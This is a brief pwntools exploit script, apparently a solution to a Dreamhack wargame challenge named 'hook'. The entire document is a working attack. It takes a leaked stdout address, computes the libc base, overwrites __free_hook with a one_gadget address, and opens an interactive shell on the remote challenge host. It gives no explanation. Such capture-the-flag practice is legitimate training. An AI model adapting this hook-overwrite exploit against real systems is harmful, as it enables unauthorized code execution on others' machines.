from pwn import *

r = remote("host3.dreamhack.games", 11082)

e = ELF("./hook")
libc = ELF("./libc.so.6")

r.recv(8)
stdout = r.recvline()
stdout = stdout[:-1]
stdout = int(stdout, 16)


libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
og = libc_base + 0x4526a
free_hook = libc_base + libc.symbols["__free_hook"]

size = 16
r.sendlineafter("Size: ", str(size))

payload = b''
payload += p64(free_hook)
payload += p64(og)

r.sendlineafter("Data: ", payload)


r.interactive()